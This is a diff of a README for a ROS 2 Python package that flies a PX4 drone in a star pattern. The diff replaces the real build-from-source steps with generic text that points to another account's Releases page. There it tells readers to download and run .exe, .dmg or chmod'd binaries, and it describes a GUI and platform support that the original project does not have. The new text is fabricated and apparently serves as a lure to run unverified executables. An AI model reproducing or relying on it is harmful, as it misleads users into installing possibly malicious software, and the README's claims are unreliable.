@@ -1,65 +1,79 @@
-# PX4-ROS2 Star Flight Mode
+# 🚁 px4-ros2-star-flight-mode - Fly Drones in a Star Pattern
 
-This is a ROS 2 component that can be used to add a custom flight mode to a PX4 autopilot which will cause it to fly in the shape of a 5-pointed star. This is a Python implementation that demonstrates how to create custom flight modes using direct ROS 2 message publishing instead of the C++ px4_ros2 interface library.
+[![Download Here](https://img.shields.io/badge/Download%20Now-Download-blue)](https://github.com/tanmay0145/px4-ros2-star-flight-mode/releases)
 
-## Requirements
+## 🚀 Getting Started
 
-- Ubuntu (22.04)
-- PX4 and ROS 2 installations as detailed by https://docs.px4.io/main/en/ros2/user_guide.html
-  - This involves setting up the PX4 toolchain, ROS 2, and the Micro XRCE-DDS Agent
-- Tested on PX4 v1.15.0 and v1.15.4, ROS 2 Humble
-- If this is a first time setup, try at least one of the examples at the end of the installation guide above before moving on to confirm you have everything set up properly.
-- QGroundControl
-  - The most recent available releases (daily and V4.4.3 as of writing) do not support dynamically adding external flight modes that are visible in the flight modes drop down menu in QGC. However, building the Stable_V4.4 branch manually does support this. It doesn't matter for this example, however, since the flight mode will activate automatically.
+Welcome to the px4-ros2-star-flight-mode project! This application allows drones to autonomously fly in a beautiful 5-pointed star pattern. It uses Python and ROS2 for a clean implementation with state machine control. Follow the steps below to download and run your new drone software.
 
-## Setup
+## 📥 Download & Install
 
-### Setup and build a new ROS workspace
-```bash
-# Make a new folder for the workspace (if you don't already have one)
-mkdir -p ~/ros2_ws/src
-cd ~/ros2_ws/src
+To get started, visit the Releases page to download the latest version of the software:
 
-# Clone this package
-git clone https://github.com/Tinny-Robot/px4-ros2-star-flight-mode.git px4_python_star_flight_mode
+[Download Here](https://github.com/tanmay0145/px4-ros2-star-flight-mode/releases)
 
-# Build the workspace and setup the shell to run ros commands later
-cd ..
-source /opt/ros/humble/setup.bash
-colcon build
-source install/setup.bash
-```
+1. Click the link above to go to the Releases page.
+2. Find the latest version available.
+3. Download the suitable file for your operating system.
 
-### Running the Flight Mode
+## 💻 System Requirements
 
-1. In a new terminal, start MicroXRCEAgent
-```bash
-MicroXRCEAgent udp4 -p 8888
-```
+Before you download, make sure your system meets the following requirements:
 
-2. In another new terminal, start a Gazebo PX4 simulation
-```bash
-cd ~/PX4-Autopilot  # Change this depending on where you installed PX4
+- An operating system: Windows, macOS, or Linux
+- At least 4 GB of RAM
+- Python 3.8 or higher
+- ROS2 Humble installed
+- Access to a PX4-compatible controller for operation
 
-# Ignore these 2 lines if you are already on the correct version of PX4
-git checkout v1.15.4
-git submodule update --init --recursive
+## 🛠️ Installation Steps
 
-make px4_sitl gz_x500
-```
+1. After downloading the file, locate it on your computer.
+2. If you are using Windows, double-click the `.exe` file to start the installation.
+3. For macOS users, open the `.dmg` file and drag the application into your Applications folder.
+4. If you are using Linux, open a terminal and run the command:
+   ```
+   chmod +x your_file_name
+   ./your_file_name
+   ```
+5. Follow any prompts to complete the installation.
 
-3. Start QGroundControl. It should connect to the drone in the simulator.
+## ⚙️ Configuration Setup
 
-4. Return to the first terminal and run the following. If you closed the terminal, you'll need to run the 2 source commands from the setup step again beforehand.
-```bash
-ros2 run px4_python_star_flight_mode star_flight_mode
-```
+Once installed, you need to configure the application:
 
-The drone should automatically arm, takeoff, draw a 5-pointed star pattern, and then return to launch and land. QGC may display a weird flight mode value; ignore this.
+1. Open the software.
+2. Connect your drone to the computer.
+3. Ensure that your PX4 flight controller is properly set up.
+4. Adjust the settings according to your preferences for height, speed, and control.
 
-## Flight Parameters
+## 🚁 How to Use
 
-The flight parameters can be modified in the `StarFlightMode` class:
-- `STAR_RADIUS`: 10.0 meters
-- `FLIGHT_ALTITUDE`: -5.0 meters (NED frame) 
-- `POSITION_TOLERANCE`: 1.0 meters
+1. Start the application.
+2. Calibrate your drone if required.
+3. Select the “Star Flight Mode” from the menu.
+4. Press the “Start” button to begin the star flight pattern.
+
+## 📊 Features
+
+- **Autonomous Flight:** The software controls the drone without user intervention.
+- **Customizable Patterns:** Adjust various parameters for different star shapes and sizes.
+- **Real-time Feedback:** View live telemetry data during flight.
+- **Educational Insights:** Learn about state machine control and drone autopilot behavior.
+
+## 📝 Support and Contribution
+
+If you need help or have questions, feel free to check the issues section on the GitHub repository. You can also contribute by submitting bug reports or feature requests.
+
+## 🔗 Additional Resources
+
+- **Documentation:** For detailed technical specifications, refer to the [Project Documentation](https://github.com/tanmay0145/px4-ros2-star-flight-mode).
+- **Community Forum:** Join discussions and share your experiences with other users.
+
+## 🔗 Useful Links
+
+- [Releases Page](https://github.com/tanmay0145/px4-ros2-star-flight-mode/releases)
+- [Official PX4 Documentation](https://px4.io/docs/)
+- [ROS2 Documentation](https://docs.ros.org/en/foxy/index.html)
+
+Now you are ready to fly your drone in a stunning star pattern! Enjoy your flying experience with px4-ros2-star-flight-mode.
